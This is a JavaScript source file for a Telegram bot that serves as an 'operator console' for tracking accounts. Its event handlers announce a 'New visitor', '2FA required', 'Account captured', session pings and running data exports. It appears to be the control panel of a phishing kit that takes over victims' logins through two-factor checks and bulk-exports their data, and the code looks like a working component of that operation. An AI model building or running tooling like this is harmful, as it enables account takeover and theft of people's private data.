import { Bot } from "grammy";
import { config } from "../config.js";
import {
  PAGE_SIZE,
  menuView,
  listView,
  itemView,
  statsView,
  confirmDeleteView,
  escapeHtml,
  accountsView,
  accountView,
  accountCard,
  countsView,
  accountStatsView,
  formatBytes,
} from "./views.js";

/* Telegram operator console.
 *
 * The bot is deliberately outside the job hot path: pool events only enqueue
 * a card, and a 2.5s coalescing timer edits one message per account.  Every
 * command answers its callback first, then edits in place.
 */

const EDIT_INTERVAL_MS = 2500;

export function startBot({ store, pool, io }) {
  if (!config.telegram.enabled) {
    console.log("[telegram] disabled (set TELEGRAM_BOT_TOKEN + TELEGRAM_ENABLED)");
    return null;
  }

  const bot = new Bot(config.telegram.token);
  let operatorChat = config.telegram.chatId;
  const lastText = new Map();
  const lastEditAt = new Map();
  const timers = new Map();
  const pending = new Map();
  const sending = new Set();

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  function chatId() {
    return operatorChat || config.telegram.chatId;
  }

  function retryAfter(error) {
    return (
      error?.parameters?.retry_after ??
      error?.error?.parameters?.retry_after ??
      error?.payload?.parameters?.retry_after ??
      0
    );
  }

  function notModified(error) {
    return String(error?.description || error?.message || "").includes(
      "message is not modified"
    );
  }

  async function flush(accountId, force = false) {
    timers.delete(accountId);
    const item = pending.get(accountId);
    if (!item || !chatId()) return;
    const account = store.getAccount(accountId);
    if (!account) return;
    if (!force && lastText.get(accountId) === item.text) {
      pending.delete(accountId);
      return;
    }
    if (!force) {
      const wait = EDIT_INTERVAL_MS - (Date.now() - (lastEditAt.get(accountId) ?? 0));
      if (wait > 0) {
        timers.set(
          accountId,
          setTimeout(() => flush(accountId, false), wait + 50)
        );
        return;
      }
    }
    if (sending.has(accountId)) return;
    sending.add(accountId);
    pending.delete(accountId);
    const options = {
      parse_mode: "HTML",
      reply_markup: accountView(account).keyboard,
      link_preview_options: { is_disabled: true },
    };
    try {
      if (account.telegramMessageId) {
        await bot.api.editMessageText(
          chatId(),
          account.telegramMessageId,
          item.text,
          options
        );
      } else {
        const message = await bot.api.sendMessage(chatId(), item.text, options);
        store.updateAccount(account.id, { telegramMessageId: message.message_id });
      }
      lastText.set(accountId, item.text);
      lastEditAt.set(accountId, Date.now());
    } catch (error) {
      if (retryAfter(error)) {
        timers.set(
          accountId,
          setTimeout(() => flush(accountId, true), retryAfter(error) * 1000 + 100)
        );
      } else if (!notModified(error)) {
        console.error("[telegram] card", error.description ?? error.message);
      }
    } finally {
      sending.delete(accountId);
      if (pending.has(accountId) && !timers.has(accountId)) {
        timers.set(
          accountId,
          setTimeout(() => flush(accountId, false), EDIT_INTERVAL_MS + 50)
        );
      }
    }
  }

  function queueCard(accountId, text, force = false) {
    if (!chatId()) return;
    pending.set(accountId, { text });
    if (timers.has(accountId)) return;
    if (force) {
      flush(accountId, true);
    } else {
      const wait = EDIT_INTERVAL_MS - (Date.now() - (lastEditAt.get(accountId) ?? 0));
      timers.set(accountId, setTimeout(() => flush(accountId, false), Math.max(wait, 0) + 50));
    }
  }

  function card(account, title = "", extra = "", force = false) {
    if (!account) return;
    queueCard(account.id, accountCard(account, { title, extra }), force);
  }

  function onPoolEvent(type, payload = {}) {
    const accountId = payload.account?.id;
    if (!accountId) return;
    const account = store.getAccount(accountId) ?? payload.account;
    if (type === "auth_start") {
      card(account, "New visitor", "Authenticating", true);
      return;
    }
    if (type === "twofa") {
      const extra = [
        `2FA: ${payload.method || "unknown"}`,
        payload.notice || "",
        payload.switchedFrom
          ? `2FA switched: ${payload.switchedFrom} → ${payload.switchedTo}`
          : "",
      ]
        .filter(Boolean)
        .join("\n");
      card(account, "2FA required", extra, true);
      return;
    }
    if (type === "result") {
      card(
        account,
        payload.status === "ok" ? "Connected" : "Authentication result",
        `${payload.status}: ${payload.message || ""}`,
        true
      );
      return;
    }
    if (type === "account_info") {
      card(account, "Account captured", "", true);
      return;
    }
    if (type === "export_progress") {
      const progress = payload.progress || account.export || {};
      const total = Number(progress.overallTotal || progress.total || 0);
      const done = Number(progress.overallDone || progress.done || 0);
      const percent = total ? Math.round((done / total) * 100) : 0;
      card(
        account,
        "Export running",
        `${progress.area || "items"} ${done}/${total} (${percent}%) · ${formatBytes(progress.bytes)}`
      );
      return;
    }
    if (type === "export_done") {
      const totals = payload.totals || {};
      card(
        account,
        "Export complete",
        `${totals.done || 0}/${totals.total || 0} · ${formatBytes(totals.bytes)}`,
        true
      );
      return;
    }
    if (type === "error") {
      card(account, "Error", payload.error || "", true);
      return;
    }
    if (type === "ping") {
      card(account, "Session ping", payload.ok ? "alive" : "dead", true);
      return;
    }
    if (type === "state") {
      card(account, "Status", `${payload.state}: ${payload.message || ""}`);
    }
  }

  /* ------------------------------------------------------------- rendering */

  function accountsPage(page = 1) {
    const data = store.listAccounts({ page, pageSize: PAGE_SIZE });
    return accountsView({
      ...data,
      items: data.items.map((account) => store.adminAccount(account)),
    });
  }

  function findAccount(shortId) {
    return store.getAccountByShortId(shortId);
  }

  async function edit(ctx, view) {
    const options = {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
      link_preview_options: { is_disabled: true },
    };
    try {
      await ctx.editMessageText(view.text, options);
    } catch (error) {
      if (notModified(error)) return;
      await ctx.reply(view.text, options).catch(() => {});
    }
  }

  function rememberChat(ctx) {
    operatorChat = String(ctx.chat?.id ?? operatorChat ?? "");
  }

  /* ---------------------------------------------------------------- commands */

  bot.command("start", (ctx) => {
    rememberChat(ctx);
    const view = accountsPage(1);
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  bot.command("menu", (ctx) => {
    rememberChat(ctx);
    const view = accountsPage(1);
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  bot.command("accounts", (ctx) => {
    rememberChat(ctx);
    const view = accountsPage(1);
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  bot.command("stats", (ctx) => {
    rememberChat(ctx);
    const view = accountStatsView(
      store.accountsStats(),
      store.jobsStats(),
      pool.slotStats()
    );
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  bot.command("list", (ctx) => {
    rememberChat(ctx);
    const view = listView(store.page({ page: 1, pageSize: PAGE_SIZE }));
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  /* ---------------------------------------------------------------- callbacks */

  bot.callbackQuery("noop", (ctx) => ctx.answerCallbackQuery());

  bot.callbackQuery(/^m:(\d+)$/, async (ctx) => {
    rememberChat(ctx);
    await ctx.answerCallbackQuery();
    await edit(ctx, accountsPage(Number(ctx.match[1])));
  });

  bot.callbackQuery("S", async (ctx) => {
    await ctx.answerCallbackQuery();
    await edit(
      ctx,
      accountStatsView(store.accountsStats(), store.jobsStats(), pool.slotStats())
    );
  });

  bot.callbackQuery(/^A:([a-f0-9]+)$/, async (ctx) => {
    rememberChat(ctx);
    const account = findAccount(ctx.match[1]);
    if (!account) return ctx.answerCallbackQuery("Account not found");
    await ctx.answerCallbackQuery();
    await edit(ctx, accountView(store.adminAccount(account)));
  });

  bot.callbackQuery(/^C:([a-f0-9]+)$/, async (ctx) => {
    const account = findAccount(ctx.match[1]);
    if (!account) return ctx.answerCallbackQuery("Account not found");
    await ctx.answerCallbackQuery();
    await edit(ctx, countsView(store.adminAccount(account)));
  });

  bot.callbackQuery(/^P:([a-f0-9]+)$/, async (ctx) => {
    const account = findAccount(ctx.match[1]);
    if (!account) return ctx.answerCallbackQuery("Account not found");
    try {
      await pool.startPing(account.id);
      await ctx.answerCallbackQuery("Ping queued");
    } catch (error) {
      await ctx.answerCallbackQuery(error.message.slice(0, 180));
    }
    await edit(ctx, accountView(store.adminAccount(store.getAccount(account.id))));
  });

  bot.callbackQuery(/^E:([a-f0-9]+):([mf])$/, async (ctx) => {
    const account = findAccount(ctx.match[1]);
    if (!account) return ctx.answerCallbackQuery("Account not found");
    const mode = ctx.match[2] === "f" ? "force" : "missing";
    try {
      await pool.startExport(account.id, { mode });
      await ctx.answerCallbackQuery(mode === "force" ? "Redownload queued" : "Export queued");
    } catch (error) {
      await ctx.answerCallbackQuery(error.message.slice(0, 180));
    }
    await edit(ctx, accountView(store.adminAccount(store.getAccount(account.id))));
  });

  /* -------------------------------------------------- legacy submissions */

  bot.callbackQuery(/^list:(\d+)$/, async (ctx) => {
    const page = Number(ctx.match[1]);
    await ctx.answerCallbackQuery();
    await edit(ctx, listView(store.page({ page, pageSize: PAGE_SIZE })));
  });

  bot.callbackQuery(/^item:(.+)$/, async (ctx) => {
    const item = store.get(ctx.match[1]);
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery();
    await edit(ctx, itemView(item));
  });

  bot.callbackQuery(/^set:([^:]+):(new|reviewed|done)$/, async (ctx) => {
    const [, id, status] = ctx.match;
    const item = store.update(id, { status });
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery(`Marked ${status}`);
    await edit(ctx, itemView(item));
  });

  bot.callbackQuery(/^delask:(.+)$/, async (ctx) => {
    const item = store.get(ctx.match[1]);
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery();
    await edit(ctx, confirmDeleteView(item));
  });

  bot.callbackQuery(/^del:(.+)$/, async (ctx) => {
    const item = store.remove(ctx.match[1]);
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery("Deleted");
    await edit(ctx, listView(store.page({ page: 1, pageSize: PAGE_SIZE })));
  });

  bot.callbackQuery("stats", async (ctx) => {
    await ctx.answerCallbackQuery();
    await edit(ctx, statsView(store.stats()));
  });

  bot.callbackQuery("menu", async (ctx) => {
    await ctx.answerCallbackQuery();
    await edit(ctx, menuView());
  });

  bot.callbackQuery("close", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.deleteMessage().catch(() => {});
  });

  bot.catch((error) => {
    console.error("[telegram]", error.error ?? error);
  });

  bot.start({ onStart: (info) => console.log(`[telegram] @${info.username} polling`) }).catch(
    (error) => console.error("[telegram] start", error)
  );

  return {
    bot,
    onPoolEvent,
    notify: card,
    stop: () => bot.stop(),
  };
}
